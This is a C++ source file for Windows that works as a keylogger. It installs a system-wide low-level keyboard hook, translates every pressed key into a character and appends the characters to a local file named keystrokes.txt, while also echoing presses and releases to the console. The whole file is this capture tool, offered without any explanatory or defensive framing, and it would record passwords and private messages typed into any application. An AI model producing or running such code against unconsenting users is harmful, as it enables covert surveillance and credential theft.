#include <windows.h>
#include <iostream>
#include <fstream>

// Declare the hook function
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        // This block will only be executed if a key was pressed
        KBDLLHOOKSTRUCT* kbhs = (KBDLLHOOKSTRUCT*)lParam;
        std::ofstream file("keystrokes.txt", std::ios::app);

        UINT scan_code = 0;
        int result = 0;
        switch (wParam)
        {
        case WM_KEYDOWN:
        case WM_SYSKEYDOWN:
            // Get the character associated with the key code
            char buffer[256];
            BYTE keystate[256];
            GetKeyboardState(keystate);
            scan_code = MapVirtualKey(kbhs->vkCode, MAPVK_VK_TO_VSC);
            WCHAR character[5];
            result = ToUnicodeEx(kbhs->vkCode, scan_code, keystate, character, 4, 0, NULL);
            if (result > 0)
            {
                int length = WideCharToMultiByte(CP_ACP, 0, character, result, buffer, sizeof(buffer), NULL, NULL);
                std::cout << "Key pressed: " << buffer << std::endl;
                // Write the character to the file
                file.write(buffer, length);
                file << '\n';
            }
            break;
        case WM_KEYUP:
        case WM_SYSKEYUP:
            std::cout << "Key released: " << kbhs->vkCode << std::endl;
            break;
        }
    }

    // Call the next hook in the chain
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main()
{
    // Install the hook function
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
    if (!hook)
    {
        std::cerr << "Failed to install hook!" << std::endl;
        return 1;
    }

    // Run the message loop to process hook events
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Uninstall the hook function
    UnhookWindowsHookEx(hook);

    return 0;
}
